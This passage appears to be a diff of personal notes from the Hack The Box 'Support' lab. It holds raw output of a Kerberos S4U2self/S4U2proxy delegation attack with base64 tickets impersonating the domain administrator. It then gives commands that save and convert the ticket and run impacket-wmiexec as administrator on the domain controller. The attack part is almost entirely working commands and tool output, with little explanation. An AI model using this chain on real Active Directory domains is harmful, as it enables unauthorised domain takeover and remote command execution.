+      3DSpig3SPzJmnGd5BNIMazfr/E0t08pa/yCiA3KAw2B8avtdtZ/242hHPXQlReCgJaxkV11N8+g2/fAx
+      WqMP+wteMEvDrDmQvOFUtF+SQ6qQzRV/UQJbtoomW9StA9wDP/2uUrj3Uv7HD5LO6iARsFDwjaxwwQkK
+      fTTw6vBwh9EOKPj/TUmub3l+6b1B4kptiqOB2jCB16ADAgEAooHPBIHMfYHJMIHGoIHDMIHAMIG9oBsw
+      GaADAgEXoRIEEFq+zUFfBkjCqz3TqqayfI6hDRsLU1VQUE9SVC5IVEKiHDAaoAMCAQGhEzARGw9GYWtl
+      Q29tcHV0ZXIwMSSjBwMFAEDhAAClERgPMjAyMjExMDkxMDMyNDlaphEYDzIwMjIxMTA5MjAzMjQ5WqcR
+      GA8yMDIyMTExNjEwMzI0OVqoDRsLU1VQUE9SVC5IVEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBv
+      cnQuaHRi
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'FakeComputer01$@SUPPORT.HTB'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2self request to ::1:88
+[+] S4U2self success!
+[*] Got a TGS for 'administrator' to 'FakeComputer01$@SUPPORT.HTB'
+[*] base64(ticket.kirbi):
+
+      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
+      AaETMBEbD0Zha2VDb21wdXRlcjAxJA==
+
+[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
+[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2proxy request to domain controller ::1:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
+
+      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
+[+] Ticket successfully imported!
+
+
+[IO.File]::WriteAllBytes("C:\Users\support\Documents\ticket.kirbi", [Convert]::FromBase64String("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"))
+
+download ticket.kirbi
+
+------------------------------------------------------------------------------------------------------------------------------------------
+10.10.11.174 dc.support.htb support.htb
+
+python3 ticket_converter.py ticket.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
+
+------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------
